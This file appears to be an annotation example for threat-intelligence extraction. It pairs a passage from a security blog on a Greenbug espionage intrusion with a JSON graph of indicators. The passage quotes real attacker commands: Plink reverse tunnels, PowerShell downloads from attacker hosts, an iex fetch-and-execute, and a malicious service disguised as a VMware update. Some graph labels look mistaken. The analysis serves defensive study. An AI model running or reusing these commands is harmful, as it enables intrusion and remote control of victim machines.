@@ -1,0 +1,85 @@
+
+
+
+Sentence : Tunnels back to attackers
+CSIDL_COMMON_APPDATA\ora‐
+cle local.exe
+CSIDL_COMMON_APPDATA\adobe adobe.exe
+c:\programdata\oracle java.ee
+On one machine in this organization, we saw some suspicious PowerShell commands executed on December 9. One of the
+files executed by PowerShell, comms.exe, is Plink. A second similar command used the Bitvise command line tunneling
+client. Both tools are used to set up a tunnel to attacker-controlled infrastructure to allow Terminal Services and RDP access
+to an internal machine.
+"CSIDL_COMMON_APPDATA\comms\comms.exe" apps.vvvnews.com -P  -l  -pw  -proxytype
+http_basic –proxyip [REDACTED] -proxyport 8080 -proxyuser [REDACTED].haq -proxypass [REDACTED] -C 
+R [REDACTED]:4015:[REDACTED]:1540
+"CSIDL_COMMON_APPDATA\comms\comms.exe" [REDACTED] -pw=[REDACTED] -s2c=[REDACTED] 1819
+[REDACTED] 3389 -proxy=y -proxyType=HTTP -proxyServer=[REDACTED] -proxyPort=8080 -proxyUsername=
+[REDACTED][REDACTED].haq -proxyPassword=
+Tools such as Plink and Bitvise are legitimate sysadmin tools, but have been seen being exploited by malicious actors before,
+including by Iranian actors earlier this year.
+Plink was also seen on a second machine in this organization, which appears to have been compromised from November
+2019 up to April 2020. The first suspicious activity on this machine was seen on November 13, when PowerShell Remoting
+was enabled on the machine to allow it to receive PowerShell commands.
+https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia 4/7
+5/21/2020 Sophisticated Espionage Group Turns Attention to Telecom Providers in South Asia | Symantec Blogs
+A PowerShell command was used to download a file from attacker controlled infrastructure and launch it with a specific
+argument.
+(New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews.com:8080/Yft.dat',
+'C:\Programdata\VMware\Vmware.exe');
+start-process C:\Programdata\VMware\Vmware.exe -arg 'L3NlcnZlcj12c2llZ3J1LmNvbSAvaWQ9NDE=';
+The argument decodes to /server=vsiegru.com /id=41. Shortly after this the Plink utility was executed to establish a
+connection to the victim network. A second PowerShell command was then executed as follows:
+Del -force C:\Programdata\Vmware\Vmware.exe;
+(New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews.com:8080/Yf.dat', 'C:\Programdata\Nt.dat');
+move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe -force;
+cmd.exe /c sc create "VMwareUpdate" binpath= "C:\Programdata\Vmware\VMware.exe
+L3NlcnZlcj1rb3BpbGthb3J1a292LmNvbSAvaWQ9NDkgL3Byb3h5PXllcyAvcHJveHl1cmw…[REDACTED]…
+BUTUxcamF2ZWQubmFiaSAvcGFzc3dvcmQ9cHRtbEAyMjMz" displayname= "VMware Update Service" start= auto;
+start-service VMwareUpdate;
+Exit;
+The encoded argument decodes to the following:
+/server=kopilkaorukov.com /id=49 /proxy=yes /proxyurl=http://[REDACTED]:8080 /credential=yes /username=
+[REDACTED][REDACTED] /password=[REDACTED]
+The attackers were then seen adding a user to the administrators group on this machine. Two further PowerShell commands
+were executed on the machine about a week later, on November 16.
+The first decodes to the following:
+iex ((New-Object Net.WebClient).DownloadString('http://apps[.]vvvnews.com:8080/Default.htt'))
+As the attackers have set up a tunnel, using the Plink tool, all connections appear to be routing to internal machine IP
+addresses. This was likely done as a means to evade detection.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "CSIDL_COMMON_APPDATA\\oracle local.exe", "type" : "EXEF"},
+        {"id": 2, "description": "CSIDL_COMMON_APPDATA\\adobe adobe.exe", "type" : "EXEF"},
+        {"id": 3, "description": "c:\\programdata\\oracle java.ee", "type" : "SYSP"},
+        {"id": 4, "description": "comms.exe (Plink)", "type" : "EXEF"},
+        {"id": 5, "description": "apps.vvvnews.com:8080", "type" : "CCSH"},
+        {"id": 6, "description": "[REDACTED]:4015:[REDACTED]:1540", "type" : "NETP"},
+        {"id": 7, "description": "[REDACTED] -pw=[REDACTED] -s2c=[REDACTED] 1819 [REDACTED] 3389", "type" : "NETP"},
+        {"id": 8, "description": "Bitvise command line tunneling client", "type" : "EXEF"},
+        {"id": 9, "description": "[REDACTED].haq", "type" : "REGI"},
+        {"id": 10, "description": "[REDACTED] -proxyType=HTTP -proxyServer=[REDACTED] -proxyPort=8080", "type" : "NETP"},
+        {"id": 11, "description": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia", "type" : "URLS"},
+        {"id": 12, "description": "http://apps[.]vvvnews.com:8080/Yft.dat", "type" : "URLS"},
+        {"id": 13, "description": "C:\\Programdata\\VMware\\Vmware.exe", "type" : "EXEF"},
+        {"id": 14, "description": "/server=vsiegru.com /id=41", "type" : "NETP"},
+        {"id": 15, "description": "http://apps[.]vvvnews.com:8080/Yf.dat", "type" : "URLS"},
+        {"id": 16, "description": "C:\\Programdata\\Nt.dat", "type" : "DOCF"},
+        {"id": 17, "description": "VMwareUpdate Service", "type" : "REGI"},
+        {"id": 18, "description": "/server=kopilkaorukov.com /id=49 /proxy=yes /proxyurl=http://[REDACTED]:8080 /credential=yes /username=[REDACTED][REDACTED] /password=[REDACTED]", "type" : "NETP"},
+        {"id": 19, "description": "http://apps[.]vvvnews.com:8080/Default.htt", "type" : "URLS"}
+    ],
+    "edges": [
+        {"source": 4, "target": 5, "rel_name" : "connects to"},
+        {"source": 4, "target": 6, "rel_name" : "sets up tunnel to"},
+        {"source": 4, "target": 7, "rel_name" : "sets up tunnel to"},
+        {"source": 8, "target": 5, "rel_name" : "connects to"},
+        {"source": 12, "target": 13, "rel_name" : "downloads file to"},
+        {"source": 13, "target": 14, "rel_name" : "launches with argument"},
+        {"source": 15, "target": 16, "rel_name" : "downloads file to"},
+        {"source": 16, "target": 17, "rel_name" : "moves and registers as service"},
+        {"source": 13, "target": 18, "rel_name" : "launches with argument"},
+        {"source": 19, "target": 4, "rel_name" : "downloads and executes script"}
+    ]
+}
